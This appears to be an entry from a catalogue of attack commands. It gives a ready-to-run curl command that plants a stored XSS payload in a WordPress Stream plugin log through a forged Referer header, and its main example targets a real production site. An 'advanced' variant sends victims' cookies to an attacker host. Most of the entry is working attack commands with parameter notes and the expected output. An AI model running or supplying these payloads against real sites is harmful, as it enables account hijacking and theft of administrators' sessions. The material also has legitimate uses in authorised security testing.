---
id: cmd-curl-inject-xss
data: >-
  curl -v -H 'Referer:
  /hello?plugin-editor.php&file=aaa%3cscript%3ealert(%27stored%20xss%27);%3c/script%3e'
  --data 'post-password=foo'
  'https://newsroom.uber.com/wp-login.php?action=postpass'
tags:
  - xss
  - http
  - injection
type: command
output: null
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:29:28.912Z'
verified: false
validated: true
submitted: true
---
# curl-inject-xss

## Command

```bash
curl -v -H 'Referer: /hello?plugin-editor.php&file=aaa%3cscript%3ealert(%27stored%20xss%27);%3c/script%3e' --data 'post-password=foo' 'https://newsroom.uber.com/wp-login.php?action=postpass'
```

## Description

This command uses curl to send a POST request to a WordPress wp-login.php endpoint, crafting a Referer header with a URL-encoded XSS payload in the 'file' parameter to inject into the Stream plugin's log during a redirect.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-v` | Enables verbose output for debugging HTTP interactions | Yes |
| `-H 'Referer: ...'` | Sets the Referer header with crafted URL including plugin-editor.php and encoded XSS | Yes |
| `--data 'post-password=foo'` | Provides POST body to trigger the postpass action and subsequent redirect | Yes |
| URL | Target endpoint (e.g., https://newsroom.uber.com/wp-login.php?action=postpass) | Yes |

## Examples

### Basic Usage

```bash
curl -v -H 'Referer: /hello?plugin-editor.php&file=aaa%3cscript%3ealert(%27stored%20xss%27);%3c/script%3e' --data 'post-password=foo' 'https://target.com/wp-login.php?action=postpass'
```

### Advanced Usage

```bash
curl -v -H 'Referer: /hello?plugin-editor.php&file=aaa%3cscript%3edocument.location=%27http://attacker.com/steal?cookie=%27+document.cookie;%3c/script%3e' --data 'post-password=foo' 'https://target.com/wp-login.php?action=postpass' -k
```

(Adds -k to ignore SSL issues and a payload for cookie exfiltration.)

## Expected Output

Verbose HTTP details including request headers, response code (e.g., 302 Found), and redirect location. No direct XSS output; success indicated by clean redirect without errors, with payload logged server-side.

## Related

- [[Related Procedure|procedures/Inject-XSS-Payload-via-Crafted-Referer]]
